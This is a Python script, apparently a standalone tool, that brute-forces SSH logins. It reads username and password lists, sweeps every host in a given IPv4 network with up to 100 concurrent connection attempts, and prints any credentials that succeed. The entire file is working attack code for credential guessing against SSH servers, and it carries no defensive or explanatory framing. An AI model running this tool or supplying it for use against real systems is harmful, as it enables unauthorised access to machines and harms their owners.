import sys, asyncio, asyncssh, argparse, ipaddress

sem = asyncio.Semaphore(100)

async def check_ssh_creds(host, username, password, port=22):
    async with sem:
        try:
            await asyncio.wait_for(
                    asyncssh.connect(host, 
                        username=username, 
                        password=password, 
                        port=port,
                        public_key_auth=False,
                        known_hosts=None),
                    timeout=3)
            print("[+] Credentials found:", host, username, password)
        except Exception as e:
            pass

async def main(targets, port, users_file, pwds_file):
    coros = []
    for target in targets:
        for username in users_file:
            for password in pwds_file:
                coros.append(check_ssh_creds(str(target), username.strip(), password.strip(), port))
            pwds_file.seek(0)
        users_file.seek(0)
    await asyncio.gather(*coros)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Async SSH brute forcer")
    parser.add_argument("targets", help="IPv4 host or network 192.168.10.5, 192.168.10.0/24, ..etc", nargs=1)
    parser.add_argument("-U", dest="users_file", help="File containing users each in a line", required=True)
    parser.add_argument("-P", dest="pwds_file", help="File containg passwords each in a line", required=True)
    parser.add_argument("-p", dest="port", help="Port to use when connecting to SSH", default=22)


    args = parser.parse_args()
    
    targets = ipaddress.IPv4Network(*args.targets).hosts()
    port = args.port
    users_file = open(args.users_file)
    pwds_file = open(args.pwds_file)

    asyncio.run(main(targets, port, users_file, pwds_file))
